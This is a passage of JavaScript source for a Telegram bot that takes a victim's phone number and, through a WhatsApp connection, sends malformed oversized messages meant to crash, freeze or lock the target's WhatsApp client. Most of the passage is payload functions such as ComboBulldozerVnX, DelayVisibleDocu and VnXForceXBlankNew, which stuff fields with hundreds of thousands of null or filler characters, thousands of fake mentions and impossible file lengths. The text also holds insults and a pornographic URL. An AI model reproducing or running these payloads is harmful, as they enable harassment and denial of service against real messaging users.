bot.command("Xzero", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /Xzero 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /Xzero 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Bulldozzer
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 60%
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Atomic Crashers Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /Xzero 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Bulldozzer
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 60%
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Atomic Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
      await DelayInvisV1(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// Hapus bug ///
bot.command("hapusbug", checkWhatsAppConnection, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const args = ctx.message.text.trim().split(/\s+/).slice(1);
  const q = args[0];

  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return ctx.reply(
      "❌ You are not authorized to view the premium list."
    );
  }

 
  if (sessions.size === 0) {
    return ctx.reply(
      "❌ ⵢ Sender Not Connected\nPlease /connect"
    );
  }

  
  if (!sock) {
    return ctx.reply(
      "❌ WhatsApp socket tidak aktif"
    );
  }

  
  if (!q) {
    return ctx.reply(
      "Cara Pakai Nih Njing!!!\n/hapusbug 62xxx"
    );
  }

  let pepec = q.replace(/[^0-9]/g, "");

  if (pepec.startsWith("0")) {
    return ctx.reply(
      "Contoh : /hapusbug 62xxx"
    );
  }

  let target = pepec + "@s.whatsapp.net";

  try {

  
    const processMessage = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: `
<blockquote><strong>｢ ⸸ ｣ Sean Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Process
<blockquote><i>By @seanoffc</i></blockquote>
`,
        parse_mode: "HTML"
      }
    );

  
    for (let i = 0; i < 3; i++) {
      await sock.sendMessage(target, {
        text: "𝐂𝐈𝐊𝐈𝐃𝐀𝐖 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐄𝐍𝐙𝐘 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
      });
    }

    
    await ctx.telegram.editMessageCaption(
      chatId,
      processMessage.message_id,
      undefined,
      `
<blockquote><strong>｢ ⸸ ｣ Sean Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Success
<blockquote><i>By @seanoffc</i></blockquote>
`,
      {
        parse_mode: "HTML"
      }
    );

    await ctx.reply("Done Clear Bug By sean😜");

  } catch (err) {
    console.error("HAPUSBUG ERROR:", err);

    await ctx.reply(
      `Ada kesalahan saat mengirim bug.\n${err.message}`
    );
  }
});
// ------------ (  FUNCTION BUGS ) -------------- \\

async function ComboBulldozerVnX(sock, target, count = 10) {
  const p1 = { groupStatusMessageV2: { message: { interactiveResponseMessage: { contextInfo: { participant: target, mentionedJid: ['0@s.whatsapp.net', ...Array.from({length: 2000}, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')], body: { text: 'Zalin', format: 'DEFAULT' }, footer: { text: '\u0000'.repeat(25000), format: 'DEFAULT' }, nativeFlowResponseMessage: { name: 'address_message', paramsJson: "\x10".repeat(9999999), version: 3 } }}}}};
  
  const p2 = { groupStatusMessageV2: { message: { imageMessage: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true", mimetype: 'image/jpeg', caption: 'VnX' + "\u0000".repeat(250000), fileLength: '19897899', contextInfo: { mentionedJid: Array.from({length: 2000}, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net") }}}}};
  
  const p3 = { groupStatusMessageV2: { message: { audioMessage: { url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true", mimetype: "audio/mp4", fileLength: "109951162777600", ptt: true, caption: "VnX" + "\u0000".repeat(250000), contextInfo: { participant: target, mentionedJid: ['0@s.whatsapp.net', ...Array.from({length: 2000}, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')], urlTrackingMap: { urlTrackingMapElements: Array.from({length: 100000}, () => ({})) }} }}}};
  
  const p4 = { groupStatusMessageV2: { message: { documentMessage: { url: "https://mmg.whatsapp.net/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0&mms3=true", mimetype: "application/msword", fileLength: "10485760", fileName: "꦳".repeat(12000), title: "\u0000".repeat(900000) }}}};

  const all = [p1, p2, p3, p4];
  
  for (let i = 0; i < count; i++) {
    for (const p of all) {
      try {
        await sock.relayMessage(target, p, { participant: { jid: target } });
        console.log(`Payload ke-${i + 1} berhasil.`);
        await new Promise(r => setTimeout(r, 100));
      } catch (e) { 
        console.log("Error:", e.message); 
      }
    }
  }
}

async function DelayVisibleDocu(sock, target) {
  const documentMessage = {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/630670309_960702549903268_27335050243240610_n.enc?ccb=11-4&oh=01_Q5Aa4gEwf6h7aBfD8bqb3FAukDEetvHPYSmETzYHQLkWsAlAtg&oe=6A25F973&_nc_sid=5e03e0&mms3=true",
      directPath: "/v/t62.7119-24/630670309_960702549903268_27335050243240610_n.enc?ccb=11-4&oh=01_Q5Aa4gEwf6h7aBfD8bqb3FAukDEetvHPYSmETzYHQLkWsAlAtg&oe=6A25F973&_nc_sid=5e03e0",
      mimetype: "application/javascript",
      mediaKey: "+GreUGW3KQJqYcP6q5s6e3ZXbfuGlWLTaCvuGZGwxtk=",
      fileEncSha256: "VkdUNwow9QIGOOnIsRTE+bnUp1NJ7EMpeuB0ooFZEXY=",
      fileSha256: "/ISQ9qS7RumnGvf91c9cavwkdeJZ3J4NIomo8MhDsDg=",
      fileLength: "543852",
      caption: "Zalin Document",
      mediaKeyTimestamp: "1778292231",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    }
  };

  const listMessage = {
    listMessage: {
      title: "\u0000".repeat(250000),
      hasMediaAttachment: false,
      description: "\u0000".repeat(250000),
      buttonText: "Zalin",
      footerText: "\u0000".repeat(250000),
      listType: 1,
      sections: [
        {
          title: "\u0000".repeat(250000),
          rows: [
            {
              title: "Zalin Bulldo",
              description: "\u0000".repeat(250000),
              rowId: "vnx_bulldo_1"
            },
            {
              title: "\u0000".repeat(250000),
              description: "\u0000".repeat(250000),
              rowId: "vnx_bulldo"
            }
          ]
        },
        {
          title: "\u0000".repeat(250000),
          rows: [
            {
              title: "\u0000".repeat(250000),
              description: "\u0000".repeat(250000),
              rowId: "bot_status"
            }
          ]
        }
      ]
    }
  };

  const nameVnX = ["address_message", "galaxy_message", "call_permission_request"];
  let vnxmbg = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "zalin Delay New Cuyy",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: nameVnX[0],
            paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
            version: 3,
          },
        },
      },
    },
  };

  try {
    await sock.relayMessage(target, documentMessage, { participant: { jid: target } });
    await sock.relayMessage(target, listMessage, { participant: { jid: target } });
    await sock.relayMessage(target, vnxmbg, { participant: { jid: target } });
  } catch (e) {
    console.log("Error:", e);
  }
}

async function VnXNewChatLock(sock, target) {
    const vnx = {
      interactiveMessage: {
        body: {
          text: "@seanoffc",
          footer: "kenal zalindra?"
        },
        nativeFlowMessage: {
          buttons: [
          {
           name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "Zvx ni bos"
            }),
           },
           {
           name: "cta_call",
            buttonParamsJson: JSON.stringify({
              display_text: "ꦽ".repeat(250000),
              phone_number: "00000000000000"
              })
            }
          ],
          version: 3
         }
      }
  };
      
await sock.relayMessage(target, vnx, {
    participant: { jid: target },
  });
}

async function VnXNewfrezeeHard(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "ZVX IS HERE BOY",
        format: 1
      },
      footer: {
        text: ""
      },
      nativeFlowMessage: {
        buttons: [
          {
           name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "VnX"
            }),
           },
           {
           name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "zalin Frezee" + "ꦾ".repeat(60000),
              url: "https://t.me/seanoffc" + "ꦽ".repeat(250000),
              }),
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function VnXNewDenglayInpisCuy(sock, target) {
   const nameVnX = [
      "address_message", 
      "galaxy_message",
      "call_permission_request"  
   ];

   let vnxmbg = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "VnX Delay New Cuyy",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   await sock.relayMessage(target, vnxmbg, { 
     participant: { jid: target } 
   });
}

async function VnXForceXBlankNew(sock, target) {
  const vnxnihk = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: 'zvx' + 'ꦽ'.repeat(250000),
          },
          footer: {
            text: 'mamam tu kontol',
          },
          header: {
            hasMediaAttachment: false,
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: 'single_select',
                buttonParamsJson: JSON.stringify({
                  title: 'zvx Lock You , Hahaha',
                }),
              },
              {
                name: 'cta_call',
                buttonParamsJson: JSON.stringify({
                  display_text: 'ꦽ'.repeat(250000),
                  phone_number: '088905293109',
                }),
              },
              {
                name: 'booking_status',
                buttonParamsJson: JSON.stringify({
                  reference_id: 'ြ'.repeat(12000),
                  status: 'zvx' + 'ꦽ'.repeat(250000),
                  title: 'zvx Here',
                  description: 'xnd',
                  action_link: 'https://xnxx.com/' + 'ꦾ'.repeat(250000),
                  action_link_title: 'ꦾ'.repeat(250000),
                }),
              },
            ],
            messageParamsJson: '{'.repeat(12000),
            messageVersion: 1,
          },
        },
      },
    },
  };

  await sock.relayMessage(target, vnxnihk, {
    participant: { jid: target },
  });
}

async function ComboRapiPoll(sock, target) {
   const nameVnX = ["address_message", "galaxy_message", "call_permission_request"];

   let vnxPayload = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "VnX Delay New Cuyy",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   let pollData = {
     pollCreationMessage: {
       encKey: Buffer.from("base64encodedkey").toString('base64'),
       name: "lu siapa?",
       options: [
         { optionName: "Julee", optionHash: Buffer.from("Yanto").toString('base64') },
         { optionName: "Syapril", optionHash: Buffer.from("ah aj").toString('base64') }
       ],
       selectableOptionsCount: 1,
       contextInfo: {
         participant: target,
         quotedMessage: { conversation: "Pesan yang di-reply" }
       },
       pollContentType: "TEXT",
       pollType: "REGULAR",
       correctAnswer: {
         optionName: "Hah",
         optionHash: Buffer.from("Maklu APD anj ").toString('base64')
       },
       endTime: 27719299918,
       hideParticipantName: false,
       allowAddOption: true
     }
   };

   let extendedPayload = {
     extendedTextMessage: {
       text: "\u200B".repeat(250000),
       title: "VnX.\u0000".repeat(250000),
       canonicalUrl: "t.me/BagasReall",
       scanLengths: [
         2899999999999999077, 1799999999999998555, 7699999999999999148,
         1069999999999999164,
       ]
     }
   };

   try {
     await sock.relayMessage(target, vnxPayload, { participant: { jid: target } });
     await sock.relayMessage(target, pollData, { participant: { jid: target } });
     await sock.relayMessage(target, extendedPayload, { participant: { jid: target } });
     
     console.log("Combo payload berhasil dikirim ke:", target);
   } catch (error) {
     console.error("Gagal mengirim:", error);
   }
}
 
// --- Jalankan Bot --- //
(async () => {
  try {
    console.clear();

    currentMode = getMode();

    
    await startSesi();

    
    await bot.launch();

    process.once("SIGINT", () => bot.stop("SIGINT"));
    process.once("SIGTERM", () => bot.stop("SIGTERM"));

    console.log("✅ Bot Telegram launched");
    console.log("🟢 System ready");

  } catch (err) {
    console.error("❌ Failed to start:", err);

    setTimeout(() => {
      
      process.exit(1);
    }, 3000);
  }
})();
